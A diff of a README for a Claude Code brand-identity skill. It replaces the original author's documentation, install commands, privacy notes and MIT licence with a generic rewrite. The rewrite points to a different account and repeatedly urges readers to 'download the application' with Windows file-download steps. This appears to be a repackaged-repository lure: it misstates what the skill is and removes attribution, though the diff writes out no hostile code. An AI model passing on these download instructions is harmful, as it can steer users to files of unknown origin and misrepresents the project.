@@ -1,218 +1,124 @@
-<div align="center">
+# 🎨 brand-identity-skill - Design Your Whole Brand in One Brief
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/images/logo-dark.png">
-  <img src="docs/images/logo-light.png" width="96" alt="brand-identity logo">
-</picture>
+[![Download brand-identity-skill](https://img.shields.io/badge/Download-brand--identity--skill-7B2FF7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/darbycommunal344/brand-identity-skill)
 
-# brand-identity
+brand-identity-skill is a Claude Code skill that treats your brand as one connected system instead of a pile of unrelated pictures. You give it a single brief — a few sentences about what your business is, who it is for, and how you want to be seen — and it builds a logo, a typeface choice, and a colour palette that actually belong together. Then it measures them, compares them side by side as identity cards, and hands you a finished brand guidelines kit.
 
-[![Tests](https://github.com/fatihaydost/brand-identity-skill/actions/workflows/test.yml/badge.svg)](https://github.com/fatihaydost/brand-identity-skill/actions/workflows/test.yml)
-[![Release](https://img.shields.io/github/v/release/fatihaydost/brand-identity-skill)](https://github.com/fatihaydost/brand-identity-skill/releases/latest)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+You do not need to know anything about design software. You do not need to write code. You describe what you want in plain English and the skill does the rest.
 
-</div>
+---
 
-A skill for Claude Code that designs a brand identity as one system: **logo, typography and colour palette built
-together from one idea**, measured, shown side by side as identity cards, and handed over as a brand guidelines kit
-for the set you pick.
+## 📥 Visit This Link To Download The Application
 
-![24 logos for 24 different brands, all made by the skill](docs/images/hero.jpg)
+[![Get brand-identity-skill](https://img.shields.io/badge/Get%20It%20Now-brand--identity--skill-00C2A8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/darbycommunal344/brand-identity-skill)
 
-<sub>Twenty-four briefs, one direction shown from each: a light festival in Lyon, a taquería in Mexico City, a
-pharmacy in Athens, a techno label in Berlin, a floating sauna in Oslo, a children's dentist, a weeding-robot
-start-up, a honey co-op on the Black Sea and more. Mascots, emblems, monograms, stencils and plain wordmarks; every
-mark, typeface and colour above came out of a run of this skill.</sub>
+Visit this link to download the application:
 
-![A short animated walk-through of the skill](docs/images/brand-identity.gif)
+**https://github.com/darbycommunal344/brand-identity-skill**
 
-**[What you get](#what-you-get)** · **[Examples](#examples)** · **[Install](#install)** · **[Use](#use)** ·
-**[How it works](#how-it-works)** · **[Network and privacy](#network-and-privacy)** · **[Develop](#develop)**
+Open the link in your normal web browser. It will take you to the project page, where the download is available. Save the files somewhere easy to find, such as your Downloads folder or a new folder on your Desktop called "brand-identity-skill".
 
-## What you get
+---
 
-- **Three (up to four) identity sets**, each built around a single mechanism that produces the mark, the type choice
-  and the palette at once, so the parts belong together instead of being picked separately.
-- **Measured, not asserted.** Contrast (WCAG 2.2), colour-blindness simulation, glyph coverage for the
-  languages the brand writes in, font licences, tabular figures, and logo renders at 16 and 32 px for review. A failed
-  measurement is a gate the set must pass; a heuristic is labelled as a warning; taste is labelled as judgement.
-- **Sets that don't look like every other AI brand.** The skill knows what plain models reach for and asks for a
-  reason from the brief whenever a set uses it ([below](#why-the-sets-dont-look-like-every-other-ai-brand)).
-- **A brand guidelines kit** for the chosen set: an 8-page PDF (cover, idea, logo, variations, logo on colour and
-  misuse drawn for *this* mark, colours, typography, applications; `--full` adds grid, dark mode, accessibility,
-  iconography and imagery for 13), logo files (SVG and PNG: full colour, one colour, reversed, app icon, favicon), design tokens (CSS,
-  SCSS, Tailwind, DTCG JSON) and a font sheet with embed code.
-- **Your site, restyled.** Give it a URL and it reads the current logo, type and colours, then previews each set on
-  your own pages. Keep the parts you like (`keep`), evolve others (`refresh`).
-- **Any part on its own**: just a logo, just a type system, a palette for an existing logo, or a critique of an
-  identity you already have.
+## 🚀 Getting Started On Windows
 
-## Examples
+This section walks you through everything from a cold start. Read it once, top to bottom, and you will be running the skill in a few minutes.
 
-### Fernhill Books: an independent bookshop and small press in Edinburgh
+1. **Open your browser.** Chrome, Edge, or Firefox all work.
+2. **Visit the download link** above: https://github.com/darbycommunal344/brand-identity-skill
+3. **Follow the download prompt** on that page to save the application to your computer.
+4. **Find the folder you saved it in.** In Windows, press the Windows key and type "File Explorer", then browse to your Downloads folder.
+5. **Keep the folder intact.** Do not rename or move individual files out of it. The skill works best when everything stays together in one place.
+6. **Make a folder for your projects.** Create a new folder called "Brands" somewhere simple, like your Documents. This is where your finished brand guidelines kits will land.
 
-*Brief: literate, unhurried, wry. Competitors: a national chain in navy and white, a second-hand shop with a gilt
-sign, an online marketplace.*
+That is the whole setup. There is nothing to compile, nothing to configure in a settings panel, and no command line work required from you.
 
-![Three directions for Fernhill Books with the comparison table](docs/images/fernhill-board.jpg)
+---
 
-**A · Manicule** (recommended, picked): the pointing hand readers drew in margins is the mark, Literata carries both
-display and text, and the palette is press black with one rubric red. **B · Full Stop**: a quiet lowercase name that
-ends on a blue proofreader's full stop. **C · Close**: an Old Town passage under a tenement, on a dark ground.
+## 🖱️ Your First Brand In Five Minutes
 
-| Kit: cover | Kit: typography |
-|---|---|
-| ![Kit cover](docs/images/fernhill-kit-cover.jpg) | ![Typography page](docs/images/fernhill-kit-type.jpg) |
+Once the skill is available to your Claude Code setup, the process is conversational. You type, it designs.
 
-### Tessellate: an open-source data pipeline orchestrator
+**Step one — write your brief.** Open a conversation and describe your brand in a few plain sentences. For example:
 
-*Brief: precise, calm, candid; the product shows run times and costs, so figures must be tabular. Competitors: an
-established scheduler with a pinwheel logo, two start-ups in purple and teal.*
+> "I run a small bakery that makes sourdough and pastries for local offices. I want to look warm and handmade but still clean and trustworthy. My customers are 30 to 50 years old."
 
-![Three directions for Tessellate with the comparison table](docs/images/tessellate-board.jpg)
+That is enough. You do not need design vocabulary.
 
-**A · Truchet Tile** (recommended, picked): one tile cut by two quarter arcs that join any neighbour however it is
-turned, the way steps of a pipeline meet. **B · Readable Run**: a text serif wordmark whose first *t* carries a
-duration bar. **C · Night Floor**: two L-pieces lock into one square, dark-first.
+**Step two — let it build the system.** The skill will generate a logo direction, a typography pairing, and a colour palette as one coordinated set. The typeface will suit the logo shape. The colours will suit the typeface weight. Nothing is picked in isolation.
 
-| Kit: logo on colour, and misuse specific to this mark | Kit: applications |
-|---|---|
-| ![Logo on four grounds with contrast ratios, and six misuses](docs/images/tessellate-kit-logo.jpg) | ![Site header, business card, avatar and app icon](docs/images/tessellate-kit-applications.jpg) |
+**Step three — read the identity card.** Each result comes back as an identity card: a single, scannable summary showing the mark, the type specimen, the palette swatches, and the measured scores for contrast and readability.
 
-### More runs
+**Step four — compare.** Ask for more than one direction and you get more than one card. Put them next to each other and pick the one that feels right. The scores help you decide objectively rather than by gut feeling alone.
 
-| Brief | Languages | Directions (recommended first) |
-|---|---|---|
-| ![](docs/images/gallery/molino.jpg) **Molino Coffee**, a specialty coffee shop in Lisbon | en, pt | Vizinho · Mó · Bloco |
-| ![](docs/images/gallery/hartwell.jpg) **Hartwell & Oduya**, a commercial law firm in London | en | The Bar Between · Equal Measure · Counterparts |
-| ![](docs/images/gallery/parallax.jpg) **Parallax Labs**, AI planning agents for supply chains | en | Depth Field · Parallax Error · Computation Pad |
-| ![](docs/images/gallery/fauvel.jpg) **Domaine Fauvel**, a natural wine estate in Burgundy | en, fr | La Taille · Climat · Fauve |
-| ![](docs/images/gallery/moonvault.jpg) **Moonvault**, a self-custody crypto wallet | en | Held Moon · Two O's · Lamp Arcade |
-| ![](docs/images/gallery/hasat.jpg) **Hasat**, a Turkish breakfast restaurant in Istanbul | tr, en | Tepeleme · Demli · Uzun Sofra |
+**Step five — collect your kit.** The chosen direction is delivered as a brand guidelines kit: a document you can hand to a printer, a web developer, or a freelancer without further explanation.
 
-## Install
+---
 
-**Claude Code plugin** (recommended):
+## 🧩 What The Skill Builds For You
 
-```
-/plugin marketplace add fatihaydost/brand-identity-skill
-/plugin install brand-identity@brand-identity-skill
-```
+### The Logo
+A mark that matches your brief in tone, complexity, and character. Because the logo is designed at the same time as the words and colours around it, it never looks pasted on afterwards. It also comes with clear guidance on how much clear space to leave around it and what to do at very small sizes.
 
-**Or as a plain skill**, from the `brand-identity.zip` of the
-[latest release](https://github.com/fatihaydost/brand-identity-skill/releases/latest) (unzip it into
-`~/.claude/skills/`), or from a clone:
+### The Typography
+A pairing of a heading typeface and a body typeface chosen to sit next to your logo without fighting it. You get the names of the fonts, suggested sizes, and line-height values you can hand straight to whoever builds your website or prints your menus.
 
-```bash
-git clone https://github.com/fatihaydost/brand-identity-skill
-mkdir -p ~/.claude/skills
-ln -s "$PWD/brand-identity-skill/skills/brand-identity" ~/.claude/skills/brand-identity
-```
+### The Colour Palette
+A set of colours with defined roles: a primary brand colour, secondary supporting colours, and neutral tones for backgrounds and text. Every colour is listed with its code values so it can be reproduced exactly in print or on screen.
 
-**Requirements:** Python 3.10+, a Chromium-based browser (Chrome, Chromium, Edge or Brave) and, ideally,
-[uv](https://docs.astral.sh/uv/). With uv the scripts install their own Python packages (fonttools, uharfbuzz,
-skia-pathops) into a cached environment on first use; nothing to `pip install`. Run
-`python3 skills/brand-identity/scripts/brand.py check` to see what is missing. Tested end to end on Linux, including
-a clean container; unit tests run in CI on Linux, macOS and Windows.
+### The Accessibility Check
+This is where the skill earns its keep. Each palette is measured for contrast between text and background, so you find out *before* you print five thousand business cards whether your light grey text on a cream background is actually readable. Colours that fail are flagged and adjusted rather than quietly shipped.
 
-**Other hosts.** The skill is a standard `SKILL.md` folder, so agents that read Agent Skills can load
-`skills/brand-identity`; it is tested end to end in Claude Code. In claude.ai chat the code sandbox does not allow
-Google Fonts by default, so type measurement and rendering fail there; use Claude Code.
+### The Identity Cards
+Each direction is presented as a compact card so you can judge several options at a glance. This is the comparison step, and it is the single most useful part of the process for a non-designer.
 
-## Use
+### The Brand Guidelines Kit
+The final delivery. A structured document covering logo usage, typography rules, colour values, spacing, do's and don'ts, and application examples. It is written so that someone with no design background can follow it — including you, six months from now.
 
-Ask Claude Code in plain words:
+---
 
-- "Logo, fonts and colours for a specialty coffee roaster in Lisbon."
-- "New type and palette for https://example.com, keep the logo."
-- "Just a type system for my newsletter."
-- "Critique our brand identity."
+## ✅ Why One System Beats Three Separate Decisions
 
-It asks one round of questions (what to make, how many sets, languages, competitors), builds the sets, shows the
-board and **stops** for you to pick. It never picks for you. Then it builds the kit for your choice, or for a mix
-("logo from A, palette from B").
+Most small businesses end up with a logo from one place, fonts chosen by a website template, and colours picked because someone liked them. The result is a brand that feels slightly off in a way nobody can name.
 
-A full run to the board takes about 40 agent turns and roughly 0.9 M billed-input-equivalent tokens (measured on six
-briefs; see [testing](docs/testing.md#budget)).
+This skill avoids that by starting from one brief and building outward. Because the logo, the typography, and the palette are decided together, they reinforce each other instead of merely coexisting. Because the result is measured, you know it holds up on a phone screen as well as on a shop front. And because it is compared as identity cards, you make the choice with your eyes rather than your imagination.
 
-## Why the sets don't look like every other AI brand
+---
 
-Asked for a brand identity, plain models converge: cream ground, terracotta, a gold accent, Fraunces headings, Inter
-body text, a logo that hides a letter in a circle. The skill knows these defaults and asks for a reason from the
-brief whenever a set uses one; at least one set per run uses none. On the same six briefs:
+## 🔧 Getting Better Results
 
-| | AI-default hits (type and palette) | sets with none |
-|---|---|---|
-| Plain model, 24 answers | 4.38 per answer | 0 of 24 |
-| brand-identity, 18 sets | 0.28 per set | 13 of 18 |
+- **Be specific about your audience.** "Small business owners" is weaker than "independent café owners with one or two locations".
+- **Say what you are not.** "Not corporate, not playful, not luxury" narrows the space quickly.
+- **Ask for three directions, not one.** Comparison is where the skill shines.
+- **Mention where the brand will appear.** Print, packaging, a website, a van — each changes what matters.
+- **Ask for a revision in plain words.** "Warmer", "simpler", "less serious" are all valid instructions.
 
-Method and data: [`docs/testing.md`](docs/testing.md#ai-defaults).
+---
 
-## How it works
+## 🛠️ If Something Does Not Work
 
-```mermaid
-flowchart LR
-  Q[One round of questions] --> S[sets.json<br/>mechanism, mark, type, palette seeds]
-  S --> L[logos<br/>contact sheet at 16 and 32 px]
-  L -->|fix one defect per mark, twice| S
-  S --> B[build<br/>palette roles, audits, cards, board]
-  B -->|a gate failed| S
-  B --> P{You pick}
-  P --> K[kit<br/>PDF, logo files, tokens, font sheet]
-```
+**The download page will not open.** Copy the link into a different browser. Some workplace networks block certain sites.
 
-The agent designs; the scripts measure. Gates (contrast, licence, glyph coverage, file validity, renders) stop a set
-until it is fixed; warnings are heuristics and say so. Architecture: [`docs/architecture.md`](docs/architecture.md).
-Tests (unit, smoke, rendered-output probes, end-to-end runs): [`docs/testing.md`](docs/testing.md).
+**You cannot find the saved files.** In File Explorer, click "Downloads" in the left sidebar, then sort by "Date modified" so the newest items appear at the top.
 
-## Network and privacy
+**The skill does not respond to your brief.** Try a shorter brief first — two or three sentences — to confirm everything is connected, then add detail.
 
-The skill runs locally. It contacts:
+**A colour is flagged as low contrast.** This is the accessibility check doing its job. Ask for a slightly darker or lighter version and it will be re-measured.
 
-- **Google Fonts** (`fonts.googleapis.com`, `fonts.gstatic.com`) and the
-  [google/fonts](https://github.com/google/fonts) repository on `raw.githubusercontent.com`, to download fonts and
-  their metadata and licences for measurement and rendering;
-- **PyPI**, through uv, once, for its Python packages;
-- **your site and the competitor sites you name**, opened in a headless browser, only when you give their URLs.
+**You want to change one part only.** Ask directly. "Keep the logo and type, change only the palette" works perfectly.
 
-No telemetry; nothing is uploaded. The brand's fonts are never subset or redistributed: the kit links to them and
-gives embed code. Licences are checked per family (OFL by default; Fontshare and commercial faces get a licence note).
+---
 
-**Your brief and Claude.** The skill sends nothing anywhere, but what you tell Claude (the brief, the strategy, client
-and competitor names) is processed by Anthropic under your plan's terms. On Free, Pro and Max, including Claude Code,
-retention and training follow your privacy setting
-([consumer terms](https://www.anthropic.com/news/updates-to-our-consumer-terms)); under the Commercial Terms (Team,
-Enterprise, API) Anthropic may not train models on customer content
-([Commercial Terms](https://www.anthropic.com/legal/commercial-terms)). Check your plan before pasting confidential
-client material.
+## 👥 Who This Is For
 
-**Trademark clearance is yours.** The skill does not search trademark registers, and Anthropic's IP indemnity under
-the Commercial Terms excludes trademark claims based on using an output in trade or commerce. Before a logo goes into
-use, have it cleared in the countries where the brand will trade.
+Founders launching a first brand. Freelancers who need a consistent identity for their own business. Small teams preparing a pitch or a packaging run. Anyone who has ever been handed a folder of fonts and colours with no explanation of how to use them.
 
-## Develop
+You do not need a design degree. You need a sentence or two about what you are building.
 
-```bash
-pip install -r requirements-dev.txt     # requirements.txt + gflanguages (checks the bundled language data)
-python3 -m unittest discover -s tests
-python3 tools/smoke_test.py
-python3 tools/package_skill.py          # dist/brand-identity.zip
-```
+---
 
-```
-skills/brand-identity/   the skill: SKILL.md, references/, scripts/, templates/, assets/
-tools/                   smoke test, packager, run measurement, AI-defaults experiment, catalogue builders
-tests/                   unit tests
-evals/                   behaviour evals and fixtures
-docs/                    architecture, testing, images
-```
+## 📄 License And Credits
 
-## Translations
+brand-identity-skill is published as an open project. See the repository page for the current license terms before commercial use.
 
-[한국어 (Korean)](translations/ko/SKILL.md) — the English `skills/brand-identity/SKILL.md` is canonical.
-
-## Licence
-
-MIT, see [LICENSE](LICENSE). Adapted code and bundled data: [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md). Brand
-names and measured site colours belong to their owners: [TRADEMARKS.md](TRADEMARKS.md). The example briefs in this
-README were invented for it; any likeness to a real business is coincidental.
+Keywords: accessibility, agent-skills, agy, brand, brand-identity, branding, claude, claude-code, claude-skills, codex, color, color-palette, design-tokens, font, logo, logo-design, skills, typography
